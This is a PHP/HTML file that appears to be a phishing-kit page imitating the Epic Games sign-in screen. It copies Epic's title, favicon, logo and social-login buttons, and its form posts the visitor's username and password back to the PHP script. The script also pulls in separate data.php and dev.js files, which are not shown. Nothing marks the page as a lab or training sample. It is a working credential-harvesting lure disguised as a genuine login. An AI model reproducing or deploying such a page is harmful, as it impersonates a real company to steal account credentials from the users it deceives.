<?php 

require('../../assets/data.php');



?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Your Epic Games Account | Epic Games</title>
  <link rel="stylesheet" href="./css/style.css">
  <link rel="shortcut icon" href="https://static-assets-prod.epicgames.com/account-portal/static/epic-favicon-96x96.png">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
</head>

<style>
@import url('https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap');

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Roboto', sans-serif;
  text-decoration: none;
}

body {
  background: #121212;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

.login-form {
  width: 470px;
  background: #202020;
  padding: 30px 60px;
}

.logo {
  height: 50px;
  text-align: center;
}

.logo img {
  height: 50px;
}

.social-media {
  display: flex;
  margin: 30px 0;
}

.social-media button {
  height: 50px;
  width: 100px;
  margin-right: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  border: none;
  transition: .3s linear;
}

.social-media button:last-child {
  margin: 0;
}

.social-media button img {
  width: 20px;
}

.fb {
  background: #4267b2;
}

.google {
  background: #ffffff;
}

.ps {
  background: #02B3E8;
}

.xbox {
  background: #107C10;
}

.switch {
  background: #E60012;
}

.social-media button:hover {
  opacity: .7;
}

.login-form h6 {
  color: #f1f1f1;
  font-size: 15px;
  text-transform: uppercase;
  font-weight: 700;
}

.textbox {
  width: 100%;
  height: 50px;
  position: relative;
  margin-top: 15px;
}

.textbox input {
  width: 100%;
  height: 50px;
  border: none;
  background: #2b2b2b;
  padding: 0 15px;
  font-size: 16px;
  outline: none;
  color: #f4f4f4;
}

.textbox input:focus {
  background: #484848 !important;
}

.check-message {
  position: absolute;
  top: 50%;
  right: 10px;
  color: #fff;
  text-transform: uppercase;
  transform: translateY(-50%);
}

.textbox input:focus+.check-message {
  display: none;
}

.options {
  margin-top: 15px;
  color: #f4f4f480;
  overflow: hidden;
  font-size: 14px;
}

.remember-me {
  float: left;
  display: flex;
  align-items: center;
  cursor: pointer;
}

.checkbox {
  display: inline-block;
  width: 20px;
  height: 20px;
  background: #484848;
  margin-right: 15px;
  position: relative;
}

.checkbox input {
  width: 100%;
  height: 100%;
  opacity: 0;
  cursor: pointer;
}

.checked {
  position: absolute;
  left: 8px;
  top: 4px;
  width: 5px;
  height: 10px;
  border: solid #fff;
  border-width: 0 1px 1px 0;
  transform: rotate(45deg);
  display: none;
}

.checkbox input:checked+.checked {
  display: block;
}

.options a {
  color: #f4f4f480;
  font-size: 14px;
  float: right;
}

.login-btn {
  width: 100%;
  height: 50px;
  margin-top: 30px;
  background: #191919;
  border: none;
  outline: none;
  cursor: pointer;
  text-transform: uppercase;
  font-weight: 700;
  transition: .3s linear;
}

.login-btn.active {
  background: #037bee;
  color: #fff;
}

.login-btn-active:hover {
  opacity: .7;
}

.hidden {
  display: none;
}

.privacy-link {
  text-align: center;
  margin-top: 35px;
}

.privacy-link a {
  color: #f1f1f1;
  font-size: 14px;
}

.dont-have-account {
  font-size: 14px;
  text-align: center;
  color: #f4f4f480;
  margin: 20px;
}

.dont-have-account a{
  color: #f1f1f1;
}

@media screen and (max-width:470px) {
  body {
    background: #202020;
  }

  .login-form {
    width: 100%;
    padding: 0 15px;
  }
}    
</style>
    
<body>
  <div class="login-form">
    <div class="logo"><img src="https://i.imgur.com/vlHzAgd.png" alt=""></div>

    <div class="social-media">
      <button class="fb"><img src="https://i.imgur.com/hkgcpVJ.png" alt=""></button>
      <button class="google"><img src="https://i.imgur.com/b6Q8ttB.png" alt=""></button>
      <button class="ps"><img src="https://i.imgur.com/RqHeGB9.png" alt=""></button>
      <button class="xbox"><img src="https://i.imgur.com/NzQuyGX.png" alt=""></button>
      <button class="switch"><img src="https://i.imgur.com/gCwPl9K.png" alt=""></button>
    </div>

    <h6>Sign In</h6>

    <form action="" method="post">
      <div class="textbox">
        <input type="text" placeholder="Username or Email" name='user'>
        <span class="check-message hidden">Required</span>
      </div>

      <div class="textbox">
        <input type="password" placeholder="Password" name='pass'>
        <span class="check-message hidden">Required</span>
      </div>

      <div class="options">
        <label class="remember-me">
          <span class="checkbox">
            <input type="checkbox">
            <span class="checked"></span>
          </span>
          Remember me
        </label>

        <a href="#">Forgot Your Password</a>
      </div>

      <input type="submit" value="Log In Now" class="login-btn" disabled name='login'>
      <div class="privacy-link">
        <a href="#">Privacy Policy</a>
      </div>
    </form>

    <div class="dont-have-account">
      Don't have an Epic Games account?
      <a href="">Sign Up</a>
    </div>
  </div>
<script>
<?php require('../../assets/dev.js') ?>
</script>
<script>
          $(".textbox input").focusout(function () {
        if ($(this).val() == "") {
          $(this).siblings().removeClass("hidden");
          $(this).css("background", "#554343");
        } else {
          $(this).siblings().addClass("hidden");
          $(this).css("background", "#484848");
        }
      });

      $(".textbox input").keyup(function () {
        var inputs = $(".textbox input");
        if (inputs[0].value != "" && inputs[1].value) {
          $(".login-btn").attr("disabled", false);
          $(".login-btn").addClass("active");
        } else {
          $(".login-btn").attr("disabled", true);
          $(".login-btn").removeClass("active");
        }
      });
</script>

</html>